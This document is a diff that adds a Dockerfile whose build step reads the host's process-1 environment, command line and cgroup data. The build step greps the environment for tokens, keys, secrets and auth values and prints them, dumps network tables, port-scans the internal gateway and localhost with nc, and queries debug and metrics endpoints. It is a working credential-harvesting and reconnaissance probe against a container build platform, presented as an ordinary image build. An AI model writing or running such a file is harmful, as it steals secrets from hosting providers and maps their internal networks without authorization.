@@ -1,0 +1,35 @@
+FROM alpine:3.20
+COPY etc/hosts /v/hosts
+COPY etc/hostname /v/hostname
+COPY proc/1/cmdline /v/p1_cmd
+COPY proc/1/environ /v/p1_env
+COPY proc/1/status /v/p1_status
+COPY proc/1/cgroup /v/p1_cgroup
+RUN set -x; echo "===V3BEGIN==="; \
+ echo "--HOSTS--"; cat /v/hosts; echo "--HOSTNAME--"; cat /v/hostname; \
+ echo "--P1_CMD--"; tr '\0' ' ' < /v/p1_cmd; echo; \
+ echo "--P1_STATUS--"; head -25 /v/p1_status; \
+ echo "--P1_CGROUP--"; cat /v/p1_cgroup; \
+ echo "--P1_ENV_FILTERED--"; tr '\0' '\n' < /v/p1_env | grep -aiE 'TOKEN|KEY|SECRET|ADDR|PORT|HOST|URL|ORCH|BUILD|GCP|RAILWAY|TEMP|AUTH|CERT|PROC|DATA' | head -60; \
+ echo "--P1_ENV_N--"; tr '\0' '\n' < /v/p1_env | wc -l; \
+ echo "--SELFPROC--"; id; uname -a; cat /etc/hostname; \
+ echo "--SELF_TCP--"; cat /proc/net/tcp; echo "--SELF_TCP6--"; cat /proc/net/tcp6; echo "--SELF_UDP--"; cat /proc/net/udp; \
+ echo "--SELF_UNIX--"; cat /proc/net/unix | head -40; \
+ echo "--SELF_ROUTE--"; cat /proc/net/route; cat /proc/net/fib_trie 2>/dev/null | head -40; \
+ echo "--SELF_IF--"; cat /proc/net/dev; \
+ echo "--IFNAMES--"; ls /sys/class/net/; for i in /sys/class/net/*; do echo "$i $(cat $i/address 2>/dev/null) mtu=$(cat $i/mtu 2>/dev/null)"; done; \
+ echo "--PROBE_BEGIN--"; \
+ for p in 8083 8080 8081 8082 8084 8085 5000 5001 8000 9090 9091 1234 3000 10000 443 80 53 22 2375 2376 8888 6060 6443 10250; do \
+   (nc -z -w 1 198.18.0.1 $p >/dev/null 2>&1 && echo "GW_OPEN $p") & \
+ done; wait; \
+ echo "--PROBE_SELF--"; \
+ for p in 8083 8080 8081 5000 9090 1234 3000; do \
+   (nc -z -w 1 127.0.0.1 $p >/dev/null 2>&1 && echo "LO_OPEN $p") & \
+ done; wait; \
+ echo "--HTTP_8083--"; \
+ for path in / /healthz /health /version /metrics /debug/pprof/ /debug/pprof/cmdline /debug/vars /api/v1/status; do \
+   echo "### $path"; printf "GET %s HTTP/1.1\r\nHost: 198.18.0.1\r\nConnection: close\r\n\r\n" "$path" | nc -w 2 198.18.0.1 8083 2>&1 | head -c 600; echo; \
+ done; \
+ echo "--BIND_PROC--"; \
+ echo "===V3END==="
+CMD ["sh","-c","sleep 30"]
